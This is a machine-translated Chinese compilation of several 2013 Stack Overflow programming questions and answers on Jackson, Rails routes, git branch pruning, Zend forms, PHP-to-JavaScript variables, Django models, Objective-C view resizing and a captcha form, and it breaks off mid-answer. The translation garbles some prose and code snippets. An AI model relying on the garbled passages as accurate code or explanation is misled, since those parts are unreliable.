> 
> 时间：2013-03-27T00:54:41.027
> 
> 标签：java, jackson

我正在尝试使用 Object Mapper 调用我的 REST 服务。

```
url = new URL("http://phx5qa01c-8539.host.com:8080/bservice/BService/v1/getSimpleString");

String str = mapper.readValue(url, String.class); 
```

那个网址会给我这个字符串 -

> {属性：[{nm：“SELLERS2”vt：“java.util.Map”状态：“SUCCESS”jsonValue：“{”lv”：[{“v”：{“regSiteId”：null，“userState”：null ,"userId":609},"cn":1}],"lmd":20130206211109}" } ]}

当我在浏览器上尝试该 URL 时，我得到了上面的字符串。但只要我在代码中做同样的事情。我在下面收到此异常-

> org.codehaus.jackson.map.JsonMappingException：无法从 START_OBJECT 令牌中反序列化 java.lang.String 的实例

任何人都可以帮我解决这个为什么我在下面得到这个例外。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T01:19:08.297

Jackson 正在尝试将您的 json 反序列化为新的字符串对象，但属性不匹配，例如它无法找到方法 String.setAttributes()。'out of START_OBJECT token' 是任何反序列化错误的包罗万象，堆栈跟踪中可能有更多信息。

尝试：

```
Map myMap = mapper.readValue(url, Map.class); 
```

或者，如果您真的想要字符串，请不要使用 Jackson，只需使用标准 java 代码或[commons-io](http://commons.apache.org/proper/commons-io/javadocs/api-2.4/org/apache/commons/io/IOUtils.html#toString%28java.net.URL%29)将 url 读取到字符串：

```
String str = IOUtils.toString(url); 
```

# ruby-on-rails-3 - Rails 3 Routes - 在所有 url 路径前添加设置字符串

> ID：15650181
> 
> 赞同：0
> 
> 时间：2013-03-27T00:55:34.253
> 
> 标签：ruby-on-rails-3, routes

我被要求更改 Rails 项目上的路由，以便路由只会响应应用程序名称（或其他任意字符串）是域名后的第一个字符串的请求，例如

`www.thething.com/appname/users/sign_in`代替`www.thething.com/users/sign_in`

`www.thething.com/appname`代替`www.thething.com`

`www.thething.com/appname/search`代替`www.thething.com/search`

我建议改用子域`appname.thething.com`，但客户端非常明确地希望 URL 采用上述格式。

`www.thething.com`将是一个启动页面，其中包含指向 的链接`www.thething.com/appname`，目的是在将来添加其他应用程序/页面，并使用新文件夹名称。

是否有一种简单的方法来修改路由文件，以便所有路由都将在`.../appname`所有资源和路由之前添加，同时在域之后？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T01:10:09.387

一种选择是将所有现有路由包装在：`namespace :appname do`...`end`中，如下所示：

```
# config/routes.rb
Appname::Application.routes.draw do
  namespace :appname do
    # existing routes go here
  end
end 
```

我不确定这是否是最优雅的解决方案，但它会优先`/appname`于所有路线。

# git - 如何删除仍然存在于远程但不再在我的 fetch refspec 中的所有远程跟踪分支

> ID：15650184
> 
> 赞同：7
> 
> 时间：2013-03-27T00:55:56.497
> 
> 标签：git

我最近重新组织了我的 refspec，`remote.origin.fetch`现在只从远程获取一小部分分支。但是，`git branch -a`向我展示了我之前获取的许多远程分支，尽管现在不再获取它们。使用`git prune`没有帮助，因为那些远程跟踪分支确实存在于远程。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-03-28T01:08:30.240

**robrich**的回答有一个很好的提示：您可以删除每个远程跟踪分支（甚至远程），然后`git fetch`从头开始只抓取您现在想要的那些。

如果您确实尝试一起删除远程，您可能需要备份您的 .git/config 文件，以便稍后添加远程时，您可以从备份中获取每个远程设置。

但是，删除远程并不会为我删除远程跟踪分支。也许我的本地回购很糟糕。对于任何有同样问题的人，我最终做的是：

```
# This deletes all remote tracking branches for all remotes. So be careful if you have multiple remotes.
git branch -r | xargs -L 1 git branch -rD 
```

另外，我有很多来自遥控器的标签，这会减慢速度。我也这样做了：

```
# Be careful! This deletes EVERY tag!
git tag | xargs -L 1 git tag -d 
```

您可能希望配置`git fetch`为下次不取回所有这些标签，这超出了此问题的范围。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-27T04:46:55.037

您可以删除遥控器并重新添加它，然后重新配置`remote.origin.fetch`. 它用木槌敲击蚂蚁山，但它会完成工作。您仍然需要删除本地分支（如果有），但这只是`git branch -D theOffendingBranchName`.

**编辑：** 如果你喜欢冒险，你可以通过`.git/refs/`删除你不喜欢的文件来掠夺。不过，请先备份您的 .git 文件夹——以防修剪出错。

# actionscript-3 - 有没有办法使用 AS3 导出 PSD

> ID：15650185
> 
> 赞同：5
> 
> 时间：2013-03-27T00:56:01.650
> 
> 标签：actionscript-3, parsing, photoshop, psd

**恳求/准备标准 SO 反弹**

这是一个通用问题，我很抱歉，因为我不是一个“菜鸟”，而且我意识到这不完全符合格式，如果你能为这个查询建议一个更好的地方，我会全力以赴。如果您选择否决或关闭，请提出替代方案。

**问题**

有人知道已经从 AS3 中生成 PSD 文件的项目吗？

**背景（如果你只是想回答一个问题，你可能不关心下面的所有内容，但如果有兴趣我可以用手）**

我在[这里找到了一个 AS3 PSD 解析器](https://github.com/warrenseine/as3-psd-parser)。

对于一些基本测试，这工作得很好（经过一些调整以避免错误）。但是，现在的任务是反转这个过程来编写一个 PSD 文件。

**当前计划（和总体目标）**

我还找到了一个文件格式[规范文档](http://www.adobe.com/devnet-apps/photoshop/fileformatashtml/PhotoshopFileFormats.htm)。

在这一点上，我的计划是从顶部开始，逐步完成构建文件每个部分（和辅助值对象）的文档。由于这将是一个非常耗时的过程，我想知道是否还有其他以前的工作可以建立。

最终我的目标是将此代码集成到我一直在从事的移动绘图项目中。由于它是一个移动项目，我必须处理操作系统杀死我的应用程序以回收内存的可能性，在这种情况下，我需要能够保存/加载应用程序的现有状态（当前具有类似于 photoshop 的 BitmapData 层，再加上能够打开 PSD 文件并在 Photoshop 中从设备中打开我的文件并保留图层会很酷）。

**实时版本和代码的链接**

该应用程序可以在这里下载（免费将保持免费，没有广告，应用程序由爱和创造每个人都可以拥有/使用的酷东西的愿望资助）：

[谷歌播放](https://play.google.com/store/apps/details?id=air.com.chitowngames.DigitalDoodler)

[亚马逊应用商店](http://amzn.com/B00BB3L1PI)

仍在开发 iOS 版本（过程比其他两个商店更复杂）

代码可以[在 github 上](https://github.com/wafflejock/FingerPainting)找到（FlashBuilderProject/FingerPainting 文件夹中的 Flash Builder 项目文件）。

**合法的**

本质上，该存储库中包含的代码都是 MIT 或 Apache 许可的（为了以防万一，现在将返回到每个作者站点的两倍以获取要复制的原始许可证）。我不是律师，但我相信我目前合法获得了项目中的所有内容，并且有义务在某些情况下包含许可证并提供我的源代码扩展。（字体来自谷歌网络字体并直接从谷歌下载Roboto [http://developer.android.com/design/style/typography.html](http://developer.android.com/design/style/typography.html)）。我写的 com.shaunhusain 包中的任何代码，你现在可以假设是[GPL](http://www.gnu.org/licenses/gpl.html)。如果有更精通法律的人想告诉我我违反了法律，以及如何违法，我将不胜感激。

其他网站包含和使用的部分包括

1.  [启动 MIT](https://code.google.com/p/actuate/)许可证
2.  [Adobe 源代码中包含的PNGEncoder2](https://github.com/cameron314/PNGEncoder2)许可证允许使用。
3.  [ShareANE](https://github.com/donglongfei/ANE-SHARE)我没有这个的许可证（他没有包括一个）作者是中国人，因此我很难弄清楚如何联系他，但我假设我可以安全地使用他的代码.

存储库中有几段代码，但目前未使用，包括来自 bytearray.org 的 GIF 解析器/编码器和来自 Grant Skinner 的 ColorMatrix 类。

**更新** 在尝试了一段时间后，我最终决定只使用[ORA 格式](http://en.wikipedia.org/wiki/OpenRaster)，因为它是开放的并且简单得多，并且可以与 GIMP 和 Krita（开源编辑器）一起正常工作。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T09:10:56.423

我不确定预期用途，但如果您在 Flash 中编译文件，您也许可以使用 JSFL 将 fla 导出到 PSD。然后将 JSFL 功能绑定到 SWF 中的按钮，该按钮作为 IDE 中的面板加载。JSFL 非常强大，但它只能在 IDE/本地工作。

# php - zend 验证在填充中不起作用（编辑表单）

> ID：15650187
> 
> 赞同：0
> 
> 时间：2013-03-27T00:56:10.990
> 
> 标签：php, zend-framework

```
 UserController.php
    -------------

    editAction (method)
    ----------

    $UserInfo = array(
            'hdn_uid'=>$UserResult['user_id'],
            'username'=>$UserResult['user_name'],
            'firstname'=>$UserResult['first_name'],

        );

    $form->populate($UserInfo);
    $this->view->form = $form;

    Forms/userEdit.php
    ------------------

    $elementDecoration = array(
                'ViewHelper',
                'Description',
                'Errors',
                array(array('data'  => 'HtmlTag'), array('tag' => 'td')),
                array('Label', array('tag' => 'td', 'placement' => 'prepend')),
                array(array('row'   => 'HtmlTag'), array('tag' => 'tr')),
            );

    $hdn_id = new Zend_Form_Element_Hidden('hdn_uid');
            $hdn_id->addFilter('Int')
                   ->removeDecorator('label')
                       ->removeDecorator('HtmlTag');        

            $this->setName('login');
            $this->setDecorators($formDecoration);

            $username = new Zend_Form_Element_Text('username'); //Note this username and in conroller  $UserInfo arr 'username' matched so in the text fields existing username is populated from table.
            $username->setLabel('Username')
                    ->setDecorators($elementDecoration)
                    ->setRequired(true)
                    ->addFilter('StripTags')
                    ->addFilter('StringTrim');

$submit = new Zend_Form_Element_Submit('submit');
$submit->setDecorators($buttonDecoration);
$this->addElements(array($hdn_id,$username,$submit)); 
```

**问题**

```
 Server side validation not working, due to some mistake in the above snippet 
```

**详细信息**

```
 Server side validation not working in the above code, when i clear the username and if i submited the button then program does not validated the field, instead it updated the empty value into table. 
```

**注意** 此相同的代码适用于用户添加表单。但它无法用于编辑表单。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-29T04:40:54.813

这条线解决了我的问题

if ($form->isValid($this->getRequest()->getPost())

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-28T12:16:58.833

这几乎是在 Zend Framework 1 中处理表单的标准工作流程：

```
public function editAction(){
    //set up the form
    $form = new Application_Form_UserEdit();
    $form->setMethod('post');
    $form->setAction('/user/edit');
    //test for POST array
    if ($this->getRequest()->isPost()) {
        //validate form
        if ($form->isValid($this->getRequest()->getPost()) {
            //get validated and filtered form values
            $data = $form->getValues();
            //do some stuff
        } // if form not valid it should redisplay with current data automatically
    } else {
        //if not POST display empty form
        $this->view->form = $form;
    }
} 
```

我希望这会有所帮助。

# php - 模型和 Db-Table Zend 框架

> ID：15650188
> 
> 赞同：1
> 
> 时间：2013-03-27T00:56:15.250
> 
> 标签：php, zend-framework, zend-db, zend-db-table

我想知道直接创建 db-adapter 或创建与 db-adapter 接口的模型更正确。

使用 db-adapter 制作经典操作 crud，或者您可以创建一个通过所有 db-adapter 的模型：

方案：

控制器 -> 模型 -> 数据库适配器

或者

控制器 -> 数据库适配器

```
Application_Model_DbTable_Guestbook class extends Zend_Db_Table_Abstract
{
     / ** Table name * /
     protected $ _name = 'table';
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T06:57:53.013

模型的一部分（例如数据映射器）使用 db 适配器来存储和检索数据库中的内容。控制器仅将请求传递给模型。该模型使用 db 适配器计算内容并将其传递回控制器。以便控制器可以将其传递给您的视图...

**所以首先：**

用户请求 -> 控制器 -> 大模型 -> 模型的小部分 -> 数据库适配器

**之后（但不是每个数据库请求都会发送给用户）：**

DB Adapter 响应 -> 模型的小部分 -> 大模型 -> 控制器 -> 视图 -> 用户屏幕 = 响应

# php - 在特定点将 PHP 变量传递给 Javascript

> ID：15650194
> 
> 赞同：3
> 
> 时间：2013-03-27T00:57:08.430
> 
> 标签：php, javascript, variables

我将 PHP 变量传递给 Javascript，但仅在代码中的特定点。随着 PHP 代码的继续，我需要的变量会发生变化。当页面加载完成时，我可以轻松地运行 Javascript 并获取 PHP 变量，但这不会传递我想要的信息。我希望 Javascript 在那时获取 PHP 变量，然后忽略对它的后续更改。

我正在使用的实际程序是几千行代码，所以我创建了一个简单的页面来解决这个问题。下面的代码显示了我正在尝试做的事情。

```
<?php
$php_var = 'something';
if(true) {
    $php_var = 'new';
    echo ' 
        <script type="text/javascript"> 
            js_var="<?php echo $php_var; ?>"; 
            alert(js_var);
        </script>
    ';
}
$php_var = 'later changes';
?>

<script type="text/javascript">
    var js_var;
</script> 
```

然而，这不起作用。js_var 在内联脚本运行时设置，但它只是设置为一个字符串，`<?php echo $php_var; ?>`而不是实际评估它。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T00:59:30.200

PHP 首先运行，然后运行任何发送到浏览器的 JS。我想你只是想要这个：

```
echo '<script type="text/javascript">
    js_var = '.json_encode($php_var).';
    alert(js_var);
</script>'; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-27T00:59:58.940

```
$php_var = "foo";
echo ' 
    <script> 
        var js_var = '. json_encode($php_var) .'; 
        alert(js_var);
    </script>
'; 
```

产生：

```
<script>
var js_var = "foo";
alert(js_var);
</script> 
```

# python - 使用 OneToOne/外部字段

> ID：15650196
> 
> 赞同：0
> 
> 时间：2013-03-27T00:57:11.690
> 
> 标签：python, django

我整个星期都在为此苦苦挣扎，我需要让它一劳永逸地休息。这可能看起来像很多代码，但核心是一个简单的概念问题。

我有一个模型 UserProfile，它具有以下字段：

```
user = models.OneToOneField(User)
weekOne = models.OneToOneField(WeekOne)
weekTwo = models.OneToOneField(WeekTwo) 
```

WeekOne 和 WeekTwo 都是具有自己独特字段 (models.Model) 的模型，它们继承自名为 Week 的自定义类。Week 只是有一些自定义函数来保存每周重新键入的一些方法以及以下代码以使其成为抽象类：

```
class Meta:
    abstract = True 
```

基本上，我希望每个用户都有一个独特的 weekOne 和 weekTwo（及以后）字段，其中包含具有用户唯一值的自定义字段。

当我第一次创建用户时（即，当他们注册时），我使用以下代码`views.py`：

```
def signup(request):
    user_form = UserCreateForm(data=request.POST)
    if request.method == 'POST':
        if user_form.is_valid():
            username = user_form.clean_username()
            password = user_form.clean_password2()
            user_form.save()
            user = authenticate(username=username, password=password)
            login(request, user)
            return redirect('/')
        else:
            return index(request, user_form=user_form)
    return redirect('/') 
```

基本的表单注册内容，这里一切正常。

现在，这就是事情变得危险的地方。我有一个 weekOne 的视图，它确保已创建用户的个人资料，如果没有，则创建一个，其代码如下：

```
@login_required
def workout1(request):
    template = "workout1.html"
    weekOne = WeekOne()
    weekOne.save()
    user, created = UserProfile.objects.get_or_create(user=request.user,
            defaults = {'weekOne': weekOne})
    name = weekOne.__unicode__()

    if created:
        context = {'user': user}
        return render(request, template, context)

    # Grab already existing User Profile
    weekOne.delete() # Was never used
    context = {'user': user, 'name': name}
    return render(request, template, context) 
```

好的。所以这很酷。但是当我尝试转到第一周的页面时，我收到以下错误：

```
workout_game_app_userprofile.weekTwo_id may not be NULL 
```

这就是我迷路的地方。我应该为每个星期视图初始化每个星期变量吗？即，对于第一周的视图，我是否应该执行如下代码：

```
weekOne = WeekOne()
weekTwo = WeekTwo()
weekThree = WeekThree() 
```

ETC。？如果我计划实施的所有 12 周都必须这样做，这似乎是荒谬的重复。

顺便说一句，在我实施第二周之前，我的模型运行良好。

另外，OneToOne 是正确使用的密钥吗？我想做一些事情，比如访问 user.weekOne.item1、user.weekOne.item2 等，并仅为该用户更改和保存它们的值。

`UPDATE`：对于 Sidharth Shah，这是我的观点和模型中的其余代码：

视图.py：

```
from django.shortcuts import render, redirect
from django.contrib.auth import login, authenticate, logout
from django.contrib.auth.models import User
from workout_game_app.forms import AuthenticateForm, UserCreateForm
from workout_game_app.models import WeekOne, WeekTwo, UserProfile
from django.http import Http404, HttpResponse
from django.contrib.auth.decorators import login_required
from django.views.decorators.csrf import csrf_exempt
from django.core import serializers
import simplejson

def index(request, auth_form=None, user_form=None):
    if request.user.is_authenticated():
        user = request.user
        name = "Missions Overview"
        context = {'user': user, 'name': name}
        template = 'workouts.html'
        return render(request, template, context)
    else:
        auth_form = auth_form or AuthenticateForm()
        user_form = user_form or UserCreateForm()
        template = 'index.html'
        context = {'auth_form': auth_form, 'user_form': user_form}
        return render(request, template, context)

def login_view(request):
    if request.method == 'POST':
        form = AuthenticateForm(data=request.POST)
        if form.is_valid():
            login(request, form.get_user())
            return redirect('/')
        else:
            return index(request, auth_form=form)
    return redirect('/')

def signup(request):
    user_form = UserCreateForm(data=request.POST)
    if request.method == 'POST':
        if user_form.is_valid():
            username = user_form.clean_username()
            password = user_form.clean_password2()
            user_form.save()
            user = authenticate(username=username, password=password)
            login(request, user)
            return redirect('/')
        else:
            return index(request, user_form=user_form)
    return redirect('/')

@login_required
def submitWorkout1(request):
    if request.method == 'POST':
        exercise = request.POST['exercise']
        try:
            amount = request.POST['amount']
        except KeyError: # No amount field on form
            amount = ""
        user = UserProfile.objects.get(user=request.user)
        week = user.weekOne
        exercise, amount, exerciseComplete, allComplete = user.updateExercise(week, exercise, amount)
        data = simplejson.dumps({
            'result': 'success',
            'exercise': exercise,
            'amount': amount,
            'exerciseComplete': exerciseComplete,
            'allComplete': allComplete
            }, indent=4)
        return HttpResponse(data)

@login_required
def workout2(request):
    template = "workout2.html"
    weekTwo = WeekTwo()
    weekTwo.save()
    user, created = UserProfile.objects.get_or_create(user=request.user,
            defaults = {'weekTwo': weekTwo})
    name = weekTwo.__unicode__()

    if created:
        context = {'user': user}
        return render(request, template, context)

    # Grab already existing User Profile
    weekTwo.delete() # Was never used
    context = {'user': user, 'name': name}
    return render(request, template, context)

@login_required
def submitWorkout2(request):
    if request.method == 'POST':
        exercise = request.POST['exercise']
        try:
            amount = request.POST['amount']
        except KeyError: # No amount field on form
            amount = ""
        user = UserProfile.objects.get(user=request.user)
        week = user.weekTwo
        exercise, amount, exerciseComplete, allComplete = user.updateExercise(week, exercise, amount)
        data = simplejson.dumps({
            'result': 'success',
            'exercise': exercise,
            'amount': amount,
            'exerciseComplete': exerciseComplete,
            'allComplete': allComplete
            }, indent=4)
        return HttpResponse(data) 
```

和models.py：

```
from django.db import models
from django.contrib.auth.models import User

class Week(models.Model):
    # List of exercises by name for the week
    exercises = []
    # Week name in unicode
    name = u''

    # Running count of benchmarks met.
    completeCount = models.PositiveSmallIntegerField(default=0)
    # Set to true if benchmarks reached. 
    weekComplete = models.BooleanField(default=False)
        # A bunch of methods

class WeekOne(Week):
    name = u'Mission One'
    exercises = ['squats', 'lunges', 'stairDaysCount', 'skipStairs']
    # Required benchmarks for given exercises
    squatBenchmark = 1000
    lungeBenchmark = 250
    stairDaysCountBenchmark = 3

    totalGoals = 4

    squats = models.PositiveIntegerField(default=0)
    lunges = models.PositiveIntegerField(default=0)
    skipStairs = models.BooleanField(default=False)
    stairDaysCount = models.PositiveSmallIntegerField(default=0)
    # A bunch of methods

class WeekTwo(Week):
    name = u'Mission Two'
    exercises = ['up3Levels', 'noHands', 'treadmill', 'vagMachine', 'extendedStairs']
    totalGoals = 5

    up3Levels = models.BooleanField(default=False)
    noHands = models.BooleanField(default=False)
    treadmill = models.BooleanField(default=False)
    vagMachine = models.BooleanField(default=False)
    extendedStairs = models.BooleanField(default=False)
    # A bunch of methods

class UserProfile(models.Model):
    user = models.OneToOneField(User)
    weekOne = models.OneToOneField(WeekOne, null=True, default=None)
    weekTwo = models.OneToOneField(WeekTwo, null=True, default=None)
    # Some methods 
```

而且，虽然它工作正常，但我的 forms.py 可以很好地衡量：

```
from django.contrib.auth.forms import AuthenticationForm, UserCreationForm
from django.contrib.auth.models import User
from django import forms
from django.utils.html import strip_tags

class UserCreateForm(UserCreationForm):
    username = forms.CharField(required=True,
            widget = forms.widgets.TextInput(attrs={'placeholder': 'Username'}))
    password1 = forms.CharField(required=True,
            widget = forms.widgets.PasswordInput(attrs={'placeholder': 'Password'}))
    password2 = forms.CharField(required=True,
            widget = forms.widgets.PasswordInput(attrs={'placeholder': 'Password'}))

    def is_valid(self):
        form = super(UserCreateForm, self).is_valid()
        for f, error in self.errors.iteritems():
            if f != '__all_':
                self.fields[f].widget.attrs.update({'class':'error', 'value':strip_tags(error)})
        return form

    class Meta:
        fields = ['username', 'password1', 'password2']
        model = User

class AuthenticateForm(AuthenticationForm):
    username = forms.CharField(
            widget = forms.widgets.TextInput(attrs={'placeholder':'Username'}))
    password2 = forms.CharField(
            widget = forms.widgets.PasswordInput(attrs={'placeholder': 'Password'})) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T02:06:52.673

您可能想要以下模型

```
user = models.OneToOneField(User)
weekOne = models.OneToOneField(WeekOne, null=True, default=None)
weekTwo = models.OneToOneField(WeekTwo, null=True, default=None) 
```

试试看，它应该工作。查看上面的代码，您正在定义字段 weekOne、weekTwo 等。我不确定您是否在创建它时分配了所有必要的字段 weekOne 对象。

# objective-c - 尝试通过函数设置 UIControl 对象的框架

> ID：15650197
> 
> 赞同：0
> 
> 时间：2013-03-27T00:57:16.740
> 
> 标签：objective-c, xcode

我正在尝试创建一个函数来更改 UILabel 或 UIButton 之类的大小，而不必每次都输入三行。这就是我所拥有的。

```
-(void)setObject:(UIControl*)object SizeWidth:(NSInteger)width Height:(NSInteger)height
{
    CGRect labelFrame = object.frame;
    labelFrame.size = CGSizeMake(width, height);
    object.frame = labelFrame;
} 
```

但是，当我给 (UIControl*)object 一个 UILabel 时，它会显示“不兼容的指针类型”。我该如何解决这个问题以适用于我可以放在 UIView 上的任何东西？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T01:07:18.277

`UILabel`不是 的子类`UIControl`，它继承自`UIView`.

尝试更改`UIControl`为`UIView`：

```
-(void)setObject:(UIView*)object SizeWidth:(NSInteger)width Height:(NSInteger)height
{
    CGRect labelFrame = object.frame;
    labelFrame.size = CGSizeMake(width, height);
    object.frame = labelFrame;
} 
```

（无论如何`UIControl`继承，并且是一个属性）`UIView``frame``UIView`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T02:20:53.273

遵循 Obj-C 风格的约定（为工作选择正确的工具）可以让其他人更有效地阅读和理解我们的代码。这里的 Objective-C 风格需要一些清理。如果您有兴趣，请参阅源代码后的我的注释。以更简洁的方式执行此操作：

您可以走类方法路线（也许在视图操作类中）

```
@implementation CCViewGeometry

+ (void)adjustView:(UIView *)view toSize:(CGSize)size
{
    CGRect frame = view.frame;
    frame.size = size;
    view.frame = frame;
}

@end 
```

或 UIView 类别路由

```
@implementation UIView (CCGeometry)

- (void)resize:(CGSize)size
{
    CGRect frame = self.frame;
    frame.size = size;
    self.frame = frame;
}

@end 
```

与此页面上的代码相关的样式说明：

1.  *所有*方法参数都应以小写字符开头。

2.  `setFoo:`用于`@property`综合 & 按照惯例，您的方法名称表示将名为的属性设置`object`为`object`. 您正在设置大小，而不是对象本身。

3.  明确。`setObject:`当您知道要传递的对象的一般类型时，为什么还要调用一个方法？

4.  UIKit 中的宽度和高度（正确地）由 CGFloat 表示，而不是 NSInteger。为什么要通过 width + height 而不是 CGSize 呢？

5.  在不需要状态时尝试使用类方法。`+`是你的朋友。不要为每一件小事都启动实例（我在 ObjC 代码中看到的大多数单例方法都应该重构为类方法）。

不关心小事的程序员最终会得到无法维护的代码——这些代码会减慢他们的速度，而那些会拖慢他们的代码。惯例和风格对任何体面的项目都很重要。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-27T01:09:59.017

标签不是 UIControl 的子类。您可以使用 UIView 代替 UIControl。

```
Here is the hierarchy for UILabel  
UILabel: UIView : UIResponder : NSObject

-(void)setObject:(UIView*)object SizeWidth:(NSInteger)width Height:(NSInteger)height
{
    CGRect labelFrame = object.frame;
    labelFrame.size = CGSizeMake(width, height);
    object.frame = labelFrame;
} 
```

给你的一个建议是，方法名称对我来说似乎有点奇怪。您可以编写一个简单的类别来更新 UIView 的大小。使用以下类别，您可以简单地调用

```
[myLabel setWidth:20 andHeight:20]; 
```

在 UIView + MyCategory.h

```
#import <UIKit/UIKit.h>

@interface UIView (MyCategory)

- (void)setWidth:(NSInteger)aWidth andHeight:(NSInteger)aHeight;

@end 
```

在 UIView + MyCategory.m

```
#import "UIView + MyCategory.h"
@implementation UIView (MyCategory)

- (void)setWidth:(NSInteger)aWidth andHeight:(NSInteger)aHeight;
{
    CGRect frameToUpdate = self.frame;
    frameToUpdate.size = CGSizeMake(aWidth, aHeight);
    self.frame = frameToUpdate;
}

@end 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-27T01:36:34.440

为了解决您要解决的实际问题，我强烈建议您使用这组帮助程序[https://github.com/kreeger/BDKGeometry](https://github.com/kreeger/BDKGeometry)

# php - 1 个表单 2 个带有验证码的提交按钮

> ID：15650199
> 
> 赞同：1
> 
> 时间：2013-03-27T00:57:29.760
> 
> 标签：php, javascript, forms, submit, captcha

我正在处理预订页面表格。我想要一个客户填写信息的表格，底部有两个提交按钮：一个保留他们的预订 72 小时，另一个允许他们现在预订并继续结帐页面。第一个按钮应该通过电子邮件将数据发送给我，然后将用户重定向到静态 html 页面。第二个按钮也应该通过电子邮件将数据发送给我，然后将用户重定向到结帐页面。

首先，以这种方式有两个提交按钮是否可能？我看过关于有同意/不同意按钮的帖子，其中不同意按钮或多或少地取消了表单，同意按钮传递数据。我需要两个按钮来传递数据，但有不同的发布操作。

其次，我的表单中插入了一个免费的验证码；我厌倦了在我的电子邮件收件箱中收到机器人表单返回。我的验证码与 1 个提交按钮一起工作得很好。但是我完全不知道如何用两个提交按钮来暗示验证码。

这是我的代码，带有验证码和一个工作提交按钮（另一个按钮尚未“连接”并工作）：

```
<h2>Traveler Information</h2>
<form action="http://www.SnapHost.com/captcha/send.aspx" method="post" id="mpNOV">
   <input type="hidden" id="skip_WhereToSend" name="skip_WhereToSend" value="my@email.com" />
   <input type="hidden" id="skip_Subject" name="skip_Subject" value="Reservation" />
   <input type="hidden" id="skip_WhereToReturn" name="skip_WhereToReturn" value="confirm.shtml" />
   <input type="hidden" id="skip_SnapHostID" name="skip_SnapHostID" value="xxx" />

<!-- form start -->
   <table width="558" border="0" cellpadding="2" cellspacing="0">
      <tr>
         <td width="214" align="right"># of Travelers</td>
         <td width="344">
            <select name="travelers" id="travelers">
              <option value="1" selected="selected">1</option>
              <option value="2">2</option>
            </select>
         </td>
      </tr>

      <tr>
         <td align="right">Room type</td>
         <td valign="top">
            <select name="room" id="room">
               <option value="" selected="selected">Select...</option>
               <option value="single">Single (1 bed)</option>
               <option value="double">Double (2 beds)</option>
               <option value="doublePlus">Superior Double (2 beds)</option>
            </select>
         </td>
      </tr>
   </table>
<!-- form end -->

<!-- captcha start -->
<table border="0" align="center" cellpadding="2" cellspacing="0" style="background-color:#b9558b;">
   <tr valign="bottom">
      <td style="padding: 0 4px 8px 8px;">
         <a href="#" onclick="return ReloadCaptchaImage('CaptchaImage');" style="font-size:11px;color: #000;">reload image</a><br />
         <a href="http://www.SnapHost.com"><img id="CaptchaImage" alt="Captcha Code" style="border-width:0px;" title="This Captcha image is intended to prevent spam. The Captcha code is generated by an online form processor. To submit this form, enter the code into the text field. For more information click on the Captcha image." src="http://www.SnapHost.com/captcha/CaptchaImage.aspx?id=PR64FH7HK8F7" /></a>
      </td>

      <td style="padding: 0 8px 8px 4px;">
         <span style="color: #fff;"><i>Enter security code:</i></span><br />
         <input id="skip_CaptchaCode" name="skip_CaptchaCode" type="text" style="width:130px; height:64px; font-size:38px;" maxlength="6" />
      </td>
   </tr>

   <tr>
      <td colspan="2" align="center" style="background-color: #fff;">
         <a href="http://www.SnapHost.com" style="text-decoration:none; font-size:11px; font-family:Verdana, Arial, Helvetica; color:#000099;">This web form is protected from SPAM by <span style="text-decoration:underline;">SnapHost.com</span></a></td>
   </tr>
</table>

<script type="text/javascript">
function ReloadCaptchaImage(captchaImageId) 
{
   var obj = document.getElementById(captchaImageId);
   var src = obj.src;
   var date = new Date();
   var pos = src.indexOf('&rad=');

   if (pos >= 0) 
   { 
      src = src.substr(0, pos); 
   }

   obj.src = src + '&rad=' + date.getTime();
   return false; }
</script>

<!-- end captcha -->
<!-- start submit buttons -->
<table width="558" border="0" cellspacing="0" cellpadding="2">
   <tr>
      <td width="55%" align="right" style="padding-top:10px; padding-bottom:10px; border-top: 1px solid #6f3957;">
         <input type="submit" name="bookMP-nov" value="Hold my reservation" class="submit" />
      </td>

      <td width="45%" style="padding-top:10px; padding-bottom:10px; border-top: 1px solid #6f3957;">
         <input type="submit" name="bookMP-nov" value="Book Now!" class="submit" />
      </td>
   </tr>
</table>
<!-- end submit buttons --> 
```

根据他们的网站，验证码可以在同一页面上多次使用。我真的很喜欢 SnapHost.com 上使用的图像，我的许多客户年龄较大，这些是我遇到的最容易阅读的图像，所以我希望我可以继续使用 SnapHost 并仍然完成我的双重提交按钮需要。

如果有人对 (A) 是否可行和 (B) 从哪里开始编写可以协同工作的双重提交按钮/验证码有任何想法，我将非常感谢您的帮助！我不确定我是否需要 php（我一无所知）或 javascript 或 jQuery（我知道一点）或其他东西。谢谢！！

* * *

更新

* * *

我尝试了这段代码，虽然它重定向到正确的页面，但验证码没有验证，并且我的表单结果没有被发回给我。让我的希望有那么一刻，却又坠落到地球上！

```
<input type="submit" onclick="var e = document.getElementById('mpNOV'); e.action='mp-NOVconfirm.shtml'; e.submit();" value="Hold my reservation" class="submit"></td>
<td width="45%" style="padding-top:10px; padding-bottom:10px; border-top: 1px solid #6f3957;">
<input type="submit" onclick="var e = document.getElementById('mpNOV'); e.action='../../index.shtml'; e.submit();" value="Book Now!" class="submit"> 
```

我也删除了这个

```
input type="hidden" id="skip_WhereToReturn" name="skip_WhereToReturn" value="http://www.happywivestravel.com/tours/machupicchu/mp-NOVconfirm.shtml" 
```

表单顶部的代码，认为它会被输入标签中的 onClick 函数替换，但显然这不是这里的答案。

我希望有一个很好的简单修复，但事实并非如此。有其他想法的人吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T12:29:36.227

更新：再次检查您的代码、问题和答案我想出了这个：

Javascript：

```
<head>
<script type='text/javascript' >
   function validateReservation()
   {
     //You can validate your captcha here
     document.forms['mpNOV'].submit(); //this submits the form
   }

   function validateBooking()
   {
     //You can validate your captcha here
